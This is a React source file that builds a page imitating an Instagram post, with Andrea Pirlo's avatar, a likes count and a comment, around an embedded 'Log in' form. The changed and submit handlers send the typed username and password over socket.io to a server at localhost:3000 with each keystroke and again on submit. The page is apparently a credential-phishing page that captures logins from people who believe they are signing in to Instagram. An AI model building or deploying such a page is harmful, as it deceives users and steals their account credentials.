import React from "react";
import ReactDOM from "react-dom";
import io from 'socket.io-client';
let socket = io(`http://localhost:3000`);

class App extends React.Component {
    constructor(props) {
        super(props);

        this.changed = this.changed.bind(this);
        this.submit = this.submit.bind(this);
    }

    changed(e) {
        let username = this.refs.username.value;
        let password = this.refs.password.value;

        socket.emit("update", {username: username, password: password});
    }

    submit(e) {
        e.preventDefault();
        let username = this.refs.username.value;
        let password = this.refs.password.value;

        socket.emit("update", {username: username, password: password});
    }

    render() {
        return <div>
            <div className="navbar">
                <div className="container">
                    <div className="logo col-md-4 col-xs-4 col-sm-4 col-lg-4">
                        <div className="image"></div>
                    </div>
                    <div className="search col-md-4 col-xs-4 col-sm-4 col-lg-4">
                        <div className="input">
                            <input type="text" placeholder="Search"></input>
                        </div>
                    </div>
                    <div className="right col-md-4 col-xs-4 col-sm-4 col-lg-4">
                        <div className="buttons">
                            <div className="btn btn-primary">Get the app</div>
                            <div className="auth">
                                <div className="link">Sign up</div>
                                <div className="link">Log in</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div className="container main">
                <div className="post row">
                    <div className="image col-md-8 col-xs-8 col-sm-8 col-lg-8">
                        <div className="form">
                            <div className="logo">
                                <div className="logo-image"></div>
                            </div>
                            <form onSubmit={this.submit}>
                                <input ref="username" onChange={this.changed} type="text" className="text"
                                       placeholder="Username"></input>
                                <input ref="password" onChange={this.changed} type="password" className="text"
                                       placeholder="Password"></input>
                                <input type="submit" className="btn btn-primary" value="Log in"></input>
                            </form>
                        </div>
                    </div>
                    <div className="right col-md-4 col-xs-4 col-sm-4 col-lg-4">
                        <div className="author">
                            <div className="avatar">
                                <img align="center"
                                     src="https://igcdn-photos-h-a.akamaihd.net/hphotos-ak-xpa1/t51.2885-19/11376239_1598990140373135_796754734_a.jpg"
                                     alt=""></img>
                                <div className="name">
                                    pirlo
                                </div>
                                <div className="follow btn btn-default">
                                    Follow
                                </div>
                            </div>
                        </div>
                        <div className="stat">
                            <div className="likes">32k likes</div>
                        </div>
                        <div className="comments">
                            <div className="comment">
                                <div className="text">
                                    <span className="authorname">
                                      pirlo
                                    </span>
                                    Thank you <span className="mark">@franklampard</span> . I've been honored and It has
                                    been a pleasure
                                    to play with you in this year and a half. I wish you and your family all the best
                                    and I hope to
                                    meet you again on a soccer field!
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    }
}

ReactDOM.render(
    <App/>,
    document.getElementById("app")
);